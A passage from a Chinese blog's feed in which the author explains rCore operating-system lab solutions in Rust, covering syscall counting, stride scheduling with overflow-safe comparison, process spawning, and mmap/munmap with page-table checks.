get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlockInner &#123;</span></span>@@ -68,6 +149,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -85,6 +178,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_zombie(&amp;self) -> bool &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.get_status() == TaskStatus::Zombie</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -118,6 +218,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -191,6 +295,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -206,6 +314,55 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p>stride 算法原理非常简单，但是有一个比较大的问题。例如两个 <code>pass = 10</code> 的进程，使用 8bit 无符号整型储存 stride， <code>p1.stride = 255, p2.stride = 250</code>，在 p2 执行一个时间片后，理论上下一次应该 p1 执行。</p><p><strong>Q1:</strong> 实际情况是轮到 p1 执行吗？为什么？ </p><p><strong>A1:</strong> 不是，对于 8 位无符号整型而言，它能够表示的最大整数为 255，因此当 p2 执行了一个时间片后，<code>p2.stride = p2.stride + pass = 250 + 10 = 4 (overflow!)</code> 。这样，下一次被调度的进程实际上还是 p2.</p><p>我们之前要求进程优先级 &gt;= 2 其实就是为了解决这个问题。可以证明，<strong>在不考虑溢出的情况下</strong>, 在进程优先级全部 &gt;= 2 的情况下，如果严格按照算法执行，那么 <code>STRIDE_MAX – STRIDE_MIN &lt;= BigStride / 2</code>.</p><p><strong>Q2:</strong> 为什么？尝试简单说明（不要求严格证明）。</p><p><strong>A2:</strong> 进程优先级 &gt;= 2，则有 <code>pass &lt;= BigStride / 2</code>，由于调度策略的影响，最大步长与最小步长的差值最大不超过 pass，那么便有 <code>STRIDE_MAX – STRIDE_MIN &lt;= pass &lt;= BigStride / 2</code>.</p><p><strong>Q3:</strong> 已知以上结论，<strong>考虑溢出的情况下</strong>，可以为 Stride 设计特别的比较器，让 <code>BinaryHeap&lt;Stride&gt;</code> 的 pop 方法能返回真正最小的 Stride。补全下列代码中的 <code>partial_cmp</code> 函数，假设两个 Stride 永远不会相等。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p> TIPS: 使用 8 bits 存储 stride, BigStride = 255, 则: <code>(125 &lt; 255) == false</code>, <code>(129 &lt; 255) == true</code>.</p></blockquote><p><strong>A3:</strong> </p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> half <span class="token operator">=</span> <span class="token class-name">BigStride</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;</span> other<span class="token number">.0</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> other<span class="token number">.0</span> <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">-</span> other<span class="token number">.0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter4练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-01T15:30:11.000Z</published>
    <updated>2024-11-04T11:43:33.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="重写-sys-get-time-和-sys-task-info"><a href="#重写-sys-get-time-和-sys-task-info" class="headerlink" title="重写 sys_get_time 和 sys_task_info"></a>重写 <code>sys_get_time</code> 和 <code>sys_task_info</code></h3><p>首先，第一个任务：由于引入了虚拟内存后，<code>sys_get_time</code> 和 <code>sys_task_info</code> 失效了，需要进行重写。</p><p>这里解释一下为什么会失效：以 <code>sys_get_time</code> 为例，用户在发起系统调用时，传入的参数 <code>_ts</code> 是用户态下的虚拟地址，它需要借助内核的软件地址转换机制，查找任务对应的页表，将 <code>_ts</code> 转换为物理地址，再对该地址处的值进行填充。这里可以使用 <code>page_table.rs</code> 中预先实现好的 <code>translated_byte_buffer</code>，它将一整个虚拟地址段翻译为一系列的物理地址段（每页一段），这样如果结构体 <code>TimeVal</code> 和 <code>TaskInfo</code> 横跨多个页面也同样适用。</p><blockquote><p>注意，内核态代码中的地址仍然是虚拟地址，只不过在 rCore 中，内核态的低 256GB 为直接映射，因此好像内核代码在直接访问物理地址，其实还是虚拟地址。</p></blockquote><h3 id="实现-mmap"><a href="#实现-mmap" class="headerlink" title="实现 mmap"></a>实现 <code>mmap</code></h3><p>POSIX 标准中的 <code>mmap</code> 是将一个文件或其他对象的数据映射到进程的地址空间中，而本实验需实现的 <code>mmap</code> 则为简化版本，只是简单地向进程地址空间中插入一段虚拟内存段，而无需为其设置初始值。</p><p>在尝试进行 <code>mmap</code> 之前，需要检查可能发生的错误。按照手册的提示，可能的错误如下：</p><ul><li>start 没有按页大小对齐</li><li><code>port &amp; !0x7 != 0</code> (port 其余位必须为0)</li><li><code>port &amp; 0x7 = 0</code> (这样的内存无意义)</li><li><code>[start, start + len)</code> 中存在已经被映射的页</li><li>物理内存不足</li></ul><p>前三个错误很容易判断，如下所示，在此不必赘述。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 1. illegal start virtual address or port</span><span class="token keyword">if</span> <span class="token operator">!</span>start_va<span class="token punctuation">.</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token operator">!</span><span class="token number">0x7</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token number">0x7</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>物理内存是否充足，需要判断尝试映射的内存长度与空闲物理内存的大小关系。rCore 所采用的物理内存策略是简单的栈式分配器，剩余物理内存大小等于 <code>end - current</code> 加上 <code>recycled.len()</code>.</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Check if the remaining physical memory is sufficient</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">is_mem_sufficient</span><span class="token punctuation">(</span>_len<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> fa <span class="token operator">=</span> <span class="token constant">FRAME_ALLOCATOR</span><span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> page_cnt <span class="token operator">=</span> fa<span class="token punctuation">.</span>end <span class="token operator">-</span> fa<span class="token punctuation">.</span>current <span class="token operator">+</span> fa<span class="token punctuation">.</span>recycled<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>_len <span class="token operator">+</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">&lt;=</span> page_cnt<span class="token punctuation">&#125;</span></code></pre><p>要判断一段虚拟内存段是否存在已被映射的页面，需要遍历每个页面的起始地址，使用软件地址转换机制尝试对该虚拟地址进行“翻译”，如果成功得到对应的页表项，则说明虚拟页面已被映射，<code>mmap</code> 出错。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 3. Check if trying to map mapped page</span><span class="token keyword">for</span> vpn <span class="token keyword">in</span> vpn_range <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>pte<span class="token punctuation">)</span> <span class="token operator">=</span> inner<span class="token punctuation">.</span>tasks<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">.</span>memory_set<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span>vpn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> pte<span class="token punctuation">.</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>检查完所有可能的错误之后，便可以开始进行实际的页面映射了。实际上，在 rCore 中，一个地址空间由若干个逻辑段（<code>MapArea</code>）组成，想要将一段虚拟内存段插入地址空间中，只需要根据 <code>sys_mmap</code> 的参数 start, len, port 构建一个 <code>MapArea</code> 数据结构，再将其插入 <code>memory_set.areas</code> 中（页表项的插入会同时实现）。实际上，rCore 中提供了这样的接口：<code>insert_framed_area</code>。</p><h3 id="实现-munmap"><a href="#实现-munmap" class="headerlink" title="实现 munmap"></a>实现 <code>munmap</code></h3><p>与 <code>mmap</code> 一样，首先检查可能的错误：<code>[start, start + len)</code> 中存在未被映射的虚存，实现方式与 <code>mmap</code> 一样，在此不再介绍。</p><p>实际上，严格的 <code>munmap</code> 实现并不简单，需要考虑将原有的 <code>memeort_set.areas</code> 中的 <code>MapArea</code> 进行进行分割处理。在这里，为了实现的简单，假设 <code>[start, start + len)</code> 正好为一个完整的逻辑段，而非一个更大逻辑段的一部分（测试样例中没有这种情况）。有了这个简化，<code>munmap</code> 就很简单了：只需遍历 <code>memory_set.areas</code> 的各个逻辑段 <code>area</code>，当找到指定逻辑段时，使用 <code>area.unmap()</code> 移除对应的页表项映射，最后将 <code>area</code> 从 <code>memory_set.areas</code> 中移除。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove framed area</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">remove_framed_area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> range<span class="token punctuation">:</span> <span class="token class-name">VPNRange</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> area <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token 